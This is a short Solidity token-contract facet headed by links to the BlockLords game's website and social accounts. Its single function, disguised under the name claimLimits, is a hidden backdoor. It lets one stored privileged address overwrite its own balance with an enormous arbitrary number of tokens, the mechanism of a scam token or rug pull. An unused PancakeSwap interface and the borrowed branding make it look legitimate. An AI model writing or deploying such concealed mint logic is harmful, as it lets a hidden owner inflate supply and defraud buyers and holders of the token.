/*
 * SPDX-License-Identifier: MIT
 * Website: https://www.blocklords.com/?utm_source=icodrops
 * X: https://twitter.com/blocklords
 * Telegram: https://t.me/blocklordsgame
 */

pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract claimLimitsFacet {
    function claimLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                4206900000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
